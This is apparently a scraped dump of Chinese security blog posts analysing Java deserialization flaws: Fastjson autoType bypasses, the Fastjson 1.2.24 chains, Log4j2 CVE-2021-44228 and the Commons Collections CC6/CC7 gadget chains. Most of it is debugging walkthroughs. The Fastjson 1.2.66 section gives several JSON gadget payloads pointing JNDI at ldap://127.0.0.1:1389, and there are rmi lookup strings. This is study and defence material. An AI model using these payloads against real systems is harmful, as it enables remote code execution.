的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。autoTypeSupport仍然要设为 true。 同样启一个 Web 服务，上传命令执行类的 class 文件； 导入依赖： 服务端代码编写（参考marshalsec）： 客户端代码编写： POC 调试调用过程都差不多，在DefaultJSONParser.parseObject() 298 行进入checkAutoType()，能成功绕过校验； 最后调用到setProperties()，调用链如图： Fastjson &lt;&#x3D; 1.2.47从 1.2.46 版本中将org.apache.ibatis.datasource加入了黑名单； 补丁绕过在1.2.47 及以前的版本中，还存在一种通用利用方式；在checkAutoType()中，要想加载到指定类，要么绕过检测，要么能从mapping中返回clazz；TypeUtils.loadClass()中的cache默认传入为 true，并且有将className添加进mapping的操作； 当传入的类是java.lang.Class时，会调用TypeUtils.loadClass()，strVal是可控的参数； 所以将val参数赋值为com.sun.rowset.JdbcRowSetImpl，就可以成功将它添加进mapping中。 构造 POC要构造两部分，一部分就是通过java.lang.Class将com.sun.rowset.JdbcRowSetImpl添加进mapping；另一部分就是构造反序列化为com.sun.rowset.JdbcRowSetImpl类型导致RCE所需要的参数； 1.2.25-1.2.32版本：仅未开启AutoType时可利用； 1.2.33-1.2.47版本：无论是否开启AutoType都可利用。 POC调试1.2.47 未开启 AutoType第一个获取到的key值是a，所以递归调用DefaultJSONParser.parseObject() 到获取key为@type； 获取到第一个@type字段的值为java.lang.Class，带入checkAutoType()进行校验； autoTypeSupport默认是 false 的，mapping里面也没有java.lang.Class，直接进入 832 行的 if 语句； buckets里是有java.lang.Class的，所以findClass会返回它； clazz不为 null 了，就在 839 行返回； 这里获取到的derializer是MiscCodec类对象； 跟进到DefaultJSONParser.parse()，进入case 4语句，1320 行获取到我们传入的val参数的值，然后在 1328 行返回；（注意调用链） 返回到MiscCodec.deserialize()，调用了TypeUtils.loadClass()； 跟进到TypeUtils.loadClass()，1125 行从mapping中寻找com.sun.rowset.JdbcRowSetImpl是找不到的；但是cache默认传入为 true，可以进入到 1153 行，将com.sun.rowset.JdbcRowSetImpl添加进了mapping中； 继续调试，相同的流程获取到b里的@type的值，带入checkAutoType()校验； autoTypeSupport为 false，进入到 828 行，应为前面已经将com.sun.rowset.JdbcRowSetImpl添加到了mapping中，所以这里是获取成功的，clazz得到com.sun.rowset.JdbcRowSetImpl，随后就在 839 行返回； 后续就是一样的流程了。 1.2.47 开启 AutoType开启了 AutoType 会进入黑名单校验，但是在校验的 if 语句中，虽然满足第一个逻辑语句，但是不满足第二个逻辑语句，因为com.sun.rowset.JdbcRowSetImpl已经被添加进mapping中了，获取结果不为 null，仍然正常返回clazz。 1.2.32 未开启 AutoType未开启 AutoType 时， 直接调用TypeUtils.getClassFromMapping返回clazz； 1.2.32 开启 AutoType开启 AutoType 时，会进入 if 语句进行黑名单校验，只有一个逻辑判断语句且满足，会在这里报异常，所以不能利用。 Fastjson &lt;&#x3D; 1.2.62补丁分析从 1.2.48 开始，将TypeUtils.loadClass()中的cache默认传为了 false，不能把指定类添加进mapping了； 并且将java.lang.Class加入了黑名单，如果开启 AutoType 就会被黑名单拦截； 补丁绕过重新找到一条利用链，触发点在org.apache.xbean.propertyeditor.JndiConverter的toObjectImpl()方法中； 它的父类AbstractConverter.toObject()中调用了toObjectImpl()；setAsText()调用了toObject()； 当反序列化调用setAsText()时，就可以触发RCE。 需要目标服务器存在 xbean-reflect；导入依赖： 构造 POC要开启 AutoType； POC 调试能成功绕过黑名单检测，加载org.apache.xbean.propertyeditor.JndiConverter；autoTypeSupport要为 true 才能进入905 行的 if 语句； 反射调用到setAsText()； 到达 lookup，成功执行命令。 不开启 AutoType 的话会在这里报异常。 Fastjson &lt;&#x3D; 1.2.66补丁分析org.apache.xbean.被加入了黑名单，黑名单已经扩展到了88个； 补丁绕过寻找黑名单中没有的类进行绕过，有以下几个类可利用； 目标服务器有 shiro-core 包：&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 Anteros-Core 和 Anteros-DBCP 包：&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ignite 包： &#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ibatis-sqlmap和 jta 包：&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;:&#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;&#125;。 原理都一样，就不一 一调式了。 Fastjson &lt;&#x3D; 1.2.68修复方法也是把前面能利用的类都加入了黑名单；还增加了一个safeMode属性，如果为 true 直接报异常，默认不开启。 补丁绕过这种绕过方式是通过expectClass参数将恶意类传入checkAutoType()进行加载。 前面几个版本的利用链expectClass参数都默认传为 null，这里我们要找到一个expectClass参数可控的地方； 看到JavaBeanDeserializer.deserialze()中从传入的type来获取expectClass的值； 那么找到调用JavaBeanDeserializer.deserialze()的地方；在DefaultJSONParser.parserObject()中，根据clazz从this.config中获取对应的deserializer，再调用它的deserialze()方法；其中对应JavaBeanDeserializer的类是java.lang.AutoCloseable； 所以@type字段传入的类型应该是java.lang.AutoCloseable；要触发RCE，还得传入一个命令执行的类，所以再传入一个@type字段，作为反序列化的类型；第二个@type会通过JavaBeanDeserializer.deserialze()中调用的checkAutoType()去加载。 还有ThrowableDeserializer.deserialze()，它是JavaBeanDeserializer的子类，存在expectClass参数位置固定为Throwable.class的地方； @type字段应传入的值就是java.lang.Throwable；恶意类也应该继承java.lang.Throwable。 构造 POCAutoCloseable命令执行类实现 AutoCloseable 接口，命令通过参数传入； 构造 JSON 字符串，是否开启 AutoType 都可； Throwable原理差不多，继承 Throwable： 需要开启 AutoType ，否则加载不到java.lang.Throwable，会报异常； POC 调试AutoCloseable进入checkAutoType()，mapping中存在java.lang.AutoCloseable，直接返回clazz； 跟进到JavaBeanDeserializer.deserialze()，expectClass的值得到java.lang.AutoCloseable，ref是第二个@type字段的值Calc，作为参数传入checkAutoType()； 因为expectClass不为 null ，所以expectClassFlag值为 true， 进入 1108 行的 if 语句，加载Calc类； 一直跟进到JavaBeanDeserializer.deserialze()，538 行获取到calc.exe，且matchField和valueParsed都为 true； 845 行把calc.exe传入到fieldValues，再传入params对象数组，最后在 1022 行进行实例化，从而触发命令执行代码。 调用链如下： Throwable进入checkAutoType()，java.lang.Throwable不在mapping中，到 1110 行才会加载； 获取到的deserializer是ThrowableDeserializer类型； 跟进调用了checkAutoType()； autoTypeSupport和expectClassFlag都为 true ，1119 行加载Calc类； clazz不是Throwable子类的话这里是会报异常的； 返回到ThrowableDeserializer.deserialze()，创建异常类；（POC 要构造对，不然很容易在这一步挂掉） 跟进，获取了恶意类的构造方法，并且实例化了该类，在此触发命令执行； 调用链如下： Fastjson &lt;&#x3D; 1.2.80补丁分析从 1.2.69 开始，对传入checkAutoType()的expectClass参数进行了 hash 计算，再校验是否是允许的类型； if 语句中涵盖的类如下： -8024746738719829346L java.io.Serializable 3247277300971823414L java.lang.Cloneable -5811778396720452501L java.io.Closeable -1368967840069965882L java.lang.AutoCloseable 2980334044947851925L java.lang.Readable 5183404141909004468L java.lang.Runnable 7222019943667248779L java.util.EventListener -2027296626235911549L java.lang.Iterable -2114196234051346931L java.util.Collection -2939497380989775398L java.lang.Object 但是在开启 AutoType 的情况下，仍然可以使用上面两种类来绕过。 参考连接："},{"title":"Fastjson 1.2.24 反序列化RCE（CVE-2017-18349）","date":"2022-09-19T11:31:55.000Z","url":"/2022/09/19/Fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4RCE%EF%BC%88CVE-2017-18349%EF%BC%89/","categories":[[" ",""]],"content":"前言Fastjson 是一种 JSON 解析器，把Java 对象转换为 JSON 字符串的过程称为序列化， JSON 字符串转换为 Java 对象的过程成反序列化。 造成该漏洞的原因是可以通过@type指定反序列化返回的类型，可以向指定类中传入 JSON 字符串，并且getOutputProperties()方法满足在反序列化时调用的条件，从而将传入的恶意字节码转换为类并实例化，导致RCE。 影响版本：Fastjson &lt;&#x3D; 1.2.24 环境搭建：导入 Fastjson 1.2.24 版本的依赖： TemplatesImpl 利用链分析先看一下 TemplatesImpl 类的方法和成员变量列表； 漏洞触发点在TemplatesImpl.getTransletInstance()的455行，对_class[_transletIndex]进行了实例化； _class初始化为 null，_transletIndex初始化为 -1，_name不能为 null，否则直接return null;，但是_name变量没有 setter 方法，所以要给它赋值的话需要在反序列化时添加Feature.SupportNonPublicField；_class满足 451 行的 if 条件，进入 defineTransletClasses()方法； 393 行判断了_bytecodes是否为空，要不为 null 才能执行到 398 行；401 行 调用了_tfactory.getExternalExtensionsMap()，_tfactory不能为 null ，否则会报错；414 行对 _bytecodes进行了遍历，并且调用loader.defineClass()，将结果赋给了_class[i]； 跟进defineClass()，返回的是ClassLoader.defineClass()，也就是说在这里将从_bytecodes[i]获取到的字节码定义为一个类； 418 行，如果上面生成的类的超类是AbstractTranslet类，_transletIndex的值就为该次循环的下标值；否则，就把生成的类记录到_auxClasses中；（ABSTRACT_TRANSLET的值初始化为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet） 也就是说，在defineTransletClasses()方法中，如果我们向_bytecodes中传入恶意类的字节码，该方法会将该字节码转换为类，赋给_class[_transletIndex]，然后在getTransletInstance()方法中实例化。 寻找什么地方调用了getTransletInstance()，找到newTransformer()； 继续找什么地方调用了newTransformer()，找到getOutputProperties()； getOutputProperties()是成员变量_outputProperties的 get 方法；并且该变量没有 set 方法，是Properties类型，属于Map接口实现类的子类，满足反序列化调用 get 方法的所有条件，所以在反序列化过程中，能够调用到getOutputProperties()方法，从而实例化我们传入的恶意类，导致RCE。 构造 POC构造一个 JSON 字符串，现在已知要满足的条有： 反序列化的类型得是TemplatesImpl类，通过@type来指定； _bytecodes是恶意类的字节码，并且该类是AbstractTranslet类的子类； _name不为 null ； _tfactory不为 null； 有_outputProperties； 先构造一个恶意类，并继承AbstractTranslet，在构造方法中写入命令执行代码； 构造 POC 如下： 把EvilTest的字节码文件进行 base64 编码，再传入_bytecodes，为什么要编码下面调试时再说。 POC 调试从反序列化跟入，到JSON.parse(String text, int features)； 跟入到DefaultJSONParser的构造方法，这里根据this.lexer的值，将token赋为了12；this.lexer是JSONScanner对象，this.text就是输入的 JSON 字符串； 继续跟进到DefaultJSONParser.parse(Object fieldName)，根据 token 的值 case 到12； 跟进parseObject()； 在JSONLexerBase.scanSymbol()中把@type取了出来返回给key； 走到下面的 if ，判断了key是否等于@type，又把下一个引号包裹的内容取了出来，也就是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，然后 276 行去加载这个类； 318 行跟进到ParserConfig.getDeserializer()，对TemplatesImpl类做了一系列判断； 410 行调用了createJavaBeanDeserializer()，跟进到 479 行调用JavaBeanInfo.build()； 在这里，把getOutputProperties()添加到了fieldList中； 返回JavaBeanInfo的对象； 回到ParserConfig 492 行，循环到outputProperties，只有 get 方法，满足 if 条件，asmEnable赋为 false； 进入 536 行 返回一个JavaBeanDeserializer对象； 在 new JavaBeanDeserializer对象的过程中也向上面一样，获取了getOutputProperties()方法，然后循环遍历将这些方法存到了this.sortedFieldDeserializers变量中； 返回JavaBeanDeserializer对象到DefaultJSONParser.parseObject()318 行；继续跟进到JavaBeanDeserializer.deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)，这个时候token为16，到358行；在while 循环中取出了sortedFieldDeserializers中的getOutputProperties()方法 接着是一顿循环，fieldIndex等于3时，就不再进入364行的 if 了，所以fieldDeser等于 null，跳过 376行的 if，进入 480行的 if ，获取下一个双引号之间的值，也就是_bytecodes作为 key ； 577 行实例化了一个TemplatesImpl类对象； 604行调用了parseField()； 跟进parseField()，760行把所有成员变量存入了this.extraFieldDeserializers； 791行调用了parseField()； 跟进，67行调用了deserialze()； 这个时候token值为14，走到153行调用parseArray()； parseArray()里面又调用了deserialze()； 这个时候token为4，进入111行调用bytesValue()，跟进发现对_bytecodes进行了base64解码操作（84-1780 就是_bytecodes的内容），所以在构造 POC 时要对_bytecodes内容进行编码； 最后得到的value就是恶意类的字节码，跟进setValue()； method为 null ，最后把 TemplatesImpl对象中的_bytecodes的值赋为了字节码； 回到JavaBeanDeserializer.deserialze()中，循环获取传入的 JSON 字符串的属性名，到获取到_outputProperties； 像前面一样，一直跟到FieldDeserializer.setValue()，这个时候获取到的method为getOutputProperties()，进入 if 语句；到78行反射调用getOutputProperties()； 跟进到getOutputProperties()； 跟进newTransformer()； 跟进getTransletInstance()，调用defineTransletClasses()，在414行将字节码转换为类赋给_class[0]； 在455行实例化EvilTest类，成功执行命令。 JdbcRowSetImpl 利用链分析漏洞触发点在JdbcRowSetImpl.connect()，326行使用lookup()检索this.getDataSourceName()返回的数据源对象名称； this.getDataSourceName()可以通过向JdbcRowSetImpl对象的dataSourceName参数传入数据源对象来指定；找到setAutoCommit()中调用了connect()，只要向JdbcRowSetImpl对象的autoCommit参数传入值，即可在反序列化时调用这个方法； 构造 POC要满足的条件很简单： 反序列化的类型是JdbcRowSetImpl类，通过@type来指定； dataSourceName指定要加载的恶意对象； 传入autoCommit， 它是 Boolean 类型，传入 true 或 false 都行； 先构造一个命令执行的类： 用 python 启一个 Web 服务，把命令执行类的.class文件放到 Web 目录下；python -m http:server 8081 编写服务端代码，将命令执行类绑定到指定名称上； 编写客户端代码，构造 JSON 字符串，进行反序列化； 命令执行成功； （使用 RMI + JNDI 方式利用需要注意 JDK 版本在8u121之前。） POC 调试反序列化和参数传递过程和 TemplatesImpl 差不多，只贴一些比较关键的地方； DefaultJSONParser.parseObject() 276行加载了com.sun.rowset.JdbcRowSetImpl类； 在ParserConfig.createJavaBeanDeserializer()中，541行调用了重载的createJavaBeanDeserializer()； 重载的createJavaBeanDeserializer()返回了一个FastjsonASMDeserializer_1_JdbcRowSetImpl类对象； 返回到DefaultJSONParser.parseObject()； 跟进 319 行，到JavaBeanDeserializer.deserialze()，198 行this.deserializer就是FastjsonASMDeserializer_1_JdbcRowSetImpl类对象，跟进显示不支持 Debug； 继续跟进跳到了parseRest()； 继续跟进到JavaBeanDeserializer.deserialze()，经过一顿循环，596行调用parseField()； 一路跟进JavaBeanDeserializer.parseField() —&gt; DefaultFieldDeserializer.parseField() —&gt; StringCodec.deserialze() —&gt; StringCodec.deserialze()，返回的是 dataSourceName的值； 回到DefaultFieldDeserializer.parseField()跟进78 行的setValue(); 这里获取到的method是setDataSourceName，就把rmi://127.0.0.1:1099/calc传给了JdbcRowSetImpl对象的dataSource变量； 返回JavaBeanDeserializer.parseField()继续循环，当获取到autoCommit参数时，调用parseField()； 同样走到setValue()，这里获取到的method是setAutoCommit()，反射调用这个方法； 一直跟进到达setAutoCommit()方法； 跟进connect()，成功到达 lookup ，命令执行成功。 调用链如下： 参考连接："},{"title":"Fastjson 简单学习","date":"2022-09-19T11:31:54.000Z","url":"/2022/09/19/Fastjson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"JSONJSON 全称“JavaScript Object Notation”，译为“JavaScript 对象表示法”，是一种轻量级的、基于文本的、开放的数据交换格式。（数据交换是指两个设别之间建立连接并相互传递数据的过程。） JSON 是一种纯字符串形式的数据，它本身不提供任何方法（函数），采用独立于变成语言的文本格式来存储和表示数据，易于程序员阅读与编写，同时也易于计算机解析和生成，通常同于在 Web 客户端与 Web服务器端之间传递数据。 JSON 语法规则所有的 JSON 数据都需要包裹在一个花括号中。 JSON 数据是以键值对的形式书写，键与值之间用:分隔；键表示数据的名称，需要以字符串的形式定义，并用双引号包裹；值可以是以下数据类型： 整型、浮点型 字符串（双引号包裹） Boolean 数组（定义在[ ]中，元素可以是任意类型，用,隔开） 对象（定义在&#123; &#125;中，内容为键值对形式，值可以是任意类型） null （最后一个值后面都不写,。） JSON 注释通过添加同名键，并在同名键前面加上特殊符号来表示注释，如下： 特殊符号可以是：@、#、?、_、/等，最好避免使用[、 ]、 &#123;、 &#125;、：等 JSON 语法里常用的符号。 Java JSON 的创建和解析Java 中没有内置任何处理 JSON 数据的函数或库，所以我们需要借助一些开源的库来实现 JSON 数据的创建和解析，比较常用的有 JSON.simple、Jackson、Gson、Moshi 、Fastjson等；这里使用 Fastjson 作演示。 导入依赖： 定义一个实体类，必须有无参构造函数： 数据转换： 运行结果： FastjsonFastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将 Java 对象序列化为JSON字符串，也可以将JSON字符串反序列化为 Java 对象。具有执行效率高的特点，应用范围广泛。 下载地址： 序列化Fastjson 中，序列化函数有toJSONString()，有很多重载方法； 在实体类的set、get方法中添加输出： 传入不同的参数进行序列化： 运行结果： 可以看到，当给toJSONString()方法传入第二个参数SerializerFeature.WriteClassName时，返回的 JSON 字符串中会多出一个@type字段，而它的值就是我们传入的 User 类。 反序列化Fastjson 中，反序列化的函数有parse()和parseObject()，它们分别都有很多重载的方法。 用不同的方法进行反序列化： 运行结果： 从结果中可以看到，当给parseObject()方法传入两个参数时，返回的结果是我们第二个参数指定的User类型，并且调用了它的 set 方法；当只给parseObject()方法传入 JSON 字符串时，返回的结果是 JSONObject 类型，不调用 set 方法；当使用parse()进行反序列化时，返回的结果是 Object 类型，不调用 set 方法；但是如果 JSON 字符串中包含@type字段，parse()反序列化的结果就是@type字段中声明的类型，并且调用它的 set 方法；parseObject()方法效果一样，只是比parse()多调用了一次toJSON()，调用了全部 get 方法。 那么，如果反序列的内容是可控的，我们就可以在 JSON 字符串前面添加@type字段来指定类，并调用它的 set &#x2F;get 方法，利用 set &#x2F; get 方法来触发恶意代码，就能进行利用。（给parseObject()方法传入第二个参数比较难利用。） 反序列化调用 set、get的特点对实体类稍作修改，把cities定义为Properties类型，并且不添加它的 set 方法； 反序列化： 因为没有给cities设置 set 方法，所以如果想要往里传值，就需要添加Feature.SupportNonPublicField参数。 先看一下运行结果： parseObject()没有添加Feature.SupportNonPublicField参数，所以就没有返回cities属性。 两个方法还有不同之处就在于parse()在调用 set 方法时调用了getCities()，而parseObject()除此之外，还将所有 get 方法都调用了一遍。 接下来慢慢看。 跟进反序列化过程到JavaBeanInfo.build()中可以看到，先反射获取了所有方法，然后经过重重判断，把满足条件的 set 方法添加到了fieldList中； 然后在下面的 for 循环中，又把满足条件的 get 方法也添加到fieldList中； if 中的判断语句如下： 而getCities()方法刚好就满足这些条件，所以会被调用。 至于parseObject()为什么会把所有 get 方法都调用一遍，是因为在他调用toJSON()后，会把所有 get 方法都记录下来，然后反射调用。 参考连接："},{"title":"Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）","date":"2022-09-19T11:31:53.000Z","url":"/2022/09/19/Log4j2%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-44228%EF%BC%89/","categories":[[" ",""]],"content":"前言此漏洞（CVE-2021-44228）是于2021年12月爆出来的“核弹”级漏洞，利用难度低、影响范围广、危害大。 漏洞原因：在 Apache Log4j2 直到 2.14.1（不包括安全版本 2.3.1、2.12.2 和 2.12.3）的版本中，配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。 受影响版本：2.0-beta9 到 2.14.1 的所有版本 漏洞复现复现环境： Log4j2: 2.14.1 JDK：8u72 创建一个Maven工程，在pom.xml中导入Log4j2的依赖； 将一个存在恶意代码的类编译成 .class 文件（编译时不能有 package）； 用 python 启一个 Web 服务，把上一步生成的 .class 文件放到启 We服务的目录下；python -m http.server 8081访问 8081 端口能看到上传的 class 文件就行了； 编写服务端代码，将恶意类绑定到指定名称上； 要注意JDK版本，要用8u121之前的，因为在 8u121及之后，默认情况下禁止通过存储在命名和目录服务中的JNDI对象工厂进行远程类加载；要启用远程类加载需要将com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase设为true；否则会报错： 编写 Log4j2 利用代码 复现成功： 漏洞分析从LOGGER.error跟起，调用了logIfEnabled()； 进入logIfEnabled()，if 里调用了Logger.isEnabled()进行判断； 然后又调用了filter()进行判断； 在filter()中判断了this.config.getFilter()是否为空，是为空，到达 return 语句，对level进行了判断；因为使用的是error()，所以这里的level值为200，满足条件，返回 true； 自然AbstractLogger.logIfEnabled()中的 if 判断为 true ，进入logMessage()；然后层层跟进：logMessageSafely() -&gt; logMessageTrackRecursion() -&gt; tryLogMessage() -&gt; Logger.log()； 判断了strategy是否是LocationAwareReliabilityStrategy接口实现类的实例； strategy默认是DefaultReliabilityStrategy类的实例，而这个类实现了LocationAwareReliabilityStrategy接口，所以判断为 true； 进入DefaultReliabilityStrategy.log() -&gt; LoggerConfig.log()； this.propertiesRequireLookup在构造方法中赋值为 false，进入 if 语句，this.properties被赋值为 null，所以props等于 null；this.logEventFactory是ReusableLogEventFactory类的对象，这个类实现了LocationAwareLogEventFactory接口，所以调用它的createEvent()，new 了一个Mutablelnstant对象，set 了一系列数据，将我们构造的JNDI表达式传入了setMessage()； 在setMessage()中调用了getMessageTextForWriting()，创建了一个初始容量为128的字符构建器messageText（INITIAL_REUSABLE_MESSAGE_SIZE默认值为128），将我们传入的 msg 放到了messageText中，长度为33。 然后调用getFormat()，如果传入的是字符串，那就返回该字符串给messageFormat； 最后将Mutablelnstant对象返回给logEvent； 接着进入重载的LoggerConfig.log()； 调用isFiltered()进行判断，this.filter为 null ，直接返回 false； 进入 if 语句，到LoggerConfig.processLogEvent()； if 里的allow()恒为 true； 进入callAppenders()，对event做了一个循环操作； 跟进到AppenderControl.callAppenfer()，shouldSkip()中的三个语句都返回为 false； 继续跟进到callAppenderPreventRecursion() -&gt; callAppender0，if 中又判断了是否有 filter 过滤，filter 任然为 null ，if 为 true； 进入tryCallAppender -&gt; AbstractOutputStreamAppender.append() -&gt; tryAppend()，ENABLE_DIRECT_ENCODER默认值为 true； 跟进directEncodeEvent() -&gt; PatternLayout.encode()； if 中的this.eventSerializer定义为如图所示，进入build()，会进入else if 或者 else 分支； return 的两个类都实现了Serializer2接口，所以PatternLayout.encode()中的 if 为 false，进入 else 分支； 跟进toText -&gt; toSerializable() ，这里进入了一个循环，formatters包含多个对象，循环调用每个 Converter 的format()方法； 每循环一次就会向buffer中添加数据； 漏洞的关键点在索引为8的MessagePatternConverter.format()； msg是MutableLogEvent类的实例，这个类实现了ReusableMessage接口，这个接口继承了StringBuilderFormattable，所以 if 为 true； doRender为 false， 所以workingBuilder设置为toAppendTo，即前面循环添加得到的buffer，这个时候长度为52，offset也为52； 接下来走的是 else 分支，把messageText添加到了workingBuilder中，长度变为了85，offset还是为52； 进入 if 中的 for 循环，从52的位置开始循环，也就是判断上面添加的messageText是否以$&#123;开头，这里显然成立，然后把我们传入的字符串取出给了value； 跟进StrSubtitutor.replace() -&gt; substitute() -&gt; 重载的substitute()，代码超级长； 先看一下现在的变量值； 进入 while ，isMatch()返回2，也就是说JNDI表达式是从索引2的位置开始的； 经过多次循环，找到JNDI表达式结束在索引为32的位置； 根据首尾位置，把jndi:rmi://127.0.0.1:1099/calc取了出来； 跟进resolveVariable() -&gt; Interpolator.lookup()；这里把JNDI表达式的第一个:的前后字符串分别取出，即jndi和rmi://127.0.0.1:1099/calc；从strLookupMap中获取jndi对应的 Lookup 对象JndiLookup； 197行进入JndiLookup.lookup() -&gt; jndiManager.lookup()，这里就是最终触发点了。 调用栈如下： lookup实现原理继续看一看lookup()里面是怎么实现远程类加载的吧。 跟进InitialContext.lookup() -&gt; getURLOrDefaultInitCtx() -&gt; NamingManager.getURLContext()，获取到使用了rmi； 继续到getURLObject()，根据schema得到一个rmiURLContextFactory类对象； 在rmiURLContextFactory.getObjectInstance()方法中 new 了一个rmiURLContext类对象； 逐步返回到InitialContext.lookup()，因为rmiURLContext继承了GenericURLContext，所以进入到GenericURLContext.lookup() -&gt; RegistryContext.lookup()-&gt; RegistryImpl_Stub.lookup()； RegistryContext.lookup()中的 var2 得到一个ReferenceWrapper_Stub类对象，跟进decodeObject()，获取从ReferenceWrapper_Stub返回的 Reference 对象； 跟进到NamingManager.getObjectInstance()，从 Reference 对象中获取到了 Factory （CalcCmd）的实例； 跟进到getObjectFactoryFromReference()，尝试用当前的类加载器加载 Factory（CalcCmd） 类，这里能成功加载，因为我是把命令执行代码写到 static 代码块中的，所以在这里一成功加载到类，就执行了命令。 如果在当前 ClassPath 中无法找到相应的类时，就使用指定的 codebase 加载；如果恶意代码写在 main 方法中，要到下面创建实例对象时才执行命令； 漏洞修复发布了修复版本2.15.0-rc1。 从 Log4j 2.15.0 开始，默认情况下禁用了消息查找功能。配置中的查找仍然有效。虽然 Log4j 2.15.0 可以选择以这种方式启用 Lookups，但强烈建议用户不要启用它。为 JNDI 连接引入了白名单机制，默认情况下只允许 localhost。但是2.15.0-rc1也很快被绕过了，找到了新的利用方式，不建议使用。 总结在打印日志的过程中，会识别$&#123;&#125;包含的字符串，并且会按:将字符串分隔；会判断:前面是什么内容，根据前面的类型来解析后面的内容，如： ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； java：允许查找Java环境配置信息； jndi：允许通过 JNDI 检索变量； 我们使用jdni，那它就会通过JNDI来检索:后面的内容，即实现远程类加载。 同理，也可以构造其他类型的利用。 参考链接："},{"title":"Java  Commons Collections 7分析","date":"2022-09-19T11:31:52.000Z","url":"/2022/09/19/Java%20%20Commons%20Collections%207%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC7也是对commons-collections 3.1版本的利用链，使用Hashtable作为反序列化的入口点，通过AbstractMap#equals来调用LazyMap#get。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析看到Hashtable#readObject，循环调用了reconstitutionPut，elements为传入的元素个数；[1] key和value都是从序列化流中得到的，序列化流中的值则是通过put传进去的；[2] 跟进reconstitutionPut；[3] for循环中调用了equals，我们先看看进入for循环的条件：e != null，而 e = tab[index]，此时tab[index]的值是为null的，所以不会进入for循环，下面的代码就是将key和value添加到tab中； 那如何才能进入for循环呢，既然调用一次reconstitutionPut不行，那我们就调用两次，也就是说put两个元素进Hashtable对象，这样elements的值就为2，readObject中的for循环就可以循环两次；第一次循环已经将第一组key和value传入到tab中了，当第二次到达reconstitutionPut中的for循环的时候，tab[index]中已经有了第一次调用时传入的值，所以不为null，可以进入for循环； 接着看看if里面的判断，要求e.hash == hash，这里的e值为tab[index]，也就是第一组传入的值，这里的hash是通过key.hashCode()获取的，也就是说要put两个hash值相等的元素进去才行； 继续跟进到AbstractMapDecorator#equals，这里的map是可控的，；[4] 跟进到AbstractMap#equals，调用了m.get()，而m是根据传入的对象获取的，也就是说如果传入的是LazyMap类对象，那么这里就是调用的LazyMap#get，便可触发RCE；[5] POC分析 代码1 和CC6一样，需要构造两个Transformer数组，因为在后面第二次调用hashtable.put()的时候也会调用到LazyMap#get，会触发RCE，可以跟进看一调用栈；[6] 所以这里构造一个fakeTransformers，里面为空就行； 代码2 先将fakeTransformers传入ChainedTransformer对象；new两个HashMap对象，都调用LazyMap.decorate，并且分别向两个对象中传值，两个key值分别为yy和zZ，因为需要这两个值的hash值相等，而在java中，yy和zZ的hash值恰好相等；[7] 然后将这两个LazyMap类对象put进Hashtable类对象； 代码3 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 最后还要remove掉yy，应为如果不去掉的话，第二次调用reconstitutionPut的时候就会存在两个key；[8] 导致进入下面的if判断，直接返回false，不再执行后面的代码；[9] POC调试第一次进入reconstitutionPut，将值传入tab：[10] 第二次进入for循环：[11] 进入equals，参数object是lazyMap2：[12] 进入下一个equals，m就是LazyMap类：[13] 进入get，成功调用transform()：[14] 命令执行成功；[15] 参考链接： 总结CC链就先分析到这里，8、9、10等剩下的链以后再接着分析；CC1-7涉及两个CC版本，3.1和4.0；3.1版本基本就是通过各种途径去调用LazyMap#get，从而实现RCE；4.0版本则是通过调用TransformingComparator#compare来实现RCE；虽然几条链分析下来都大同小异，但也提升了不少分析代码的能力，获益匪浅。 疑问代码：lazyMap2.remove(&quot;yy&quot;);yy怎么在lazyMap2里"},{"title":"Java  Commons Collection 6分析","date":"2022-09-19T11:31:51.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%206%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC6还是通过调用LazyMap#get来触发RCE，任然用到了TiedMapEntry类，只不过是通过调用TiedMapEntry#getValue的链不一样。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析找到调用LazyMap#get的地方，任然是TiedMapEntry#getValue，map可控，传入LazyMap即可；[1] 接下来寻找调用getValue()的地方，找到TiedMapEntry#hashCode；[2] 接着寻找调用hashCode()的地方，找到HashMap#hash；[3] 继续寻找调用hash()的地方，找到HashMap#put；[4] 最后，在HashSet#readObject中，调用了put()；[5] POC分析代码1 构造两个Transformer数组，因为在后面调用add()的时候也会触发RCE，用两个不同的命令加以区分； 代码2 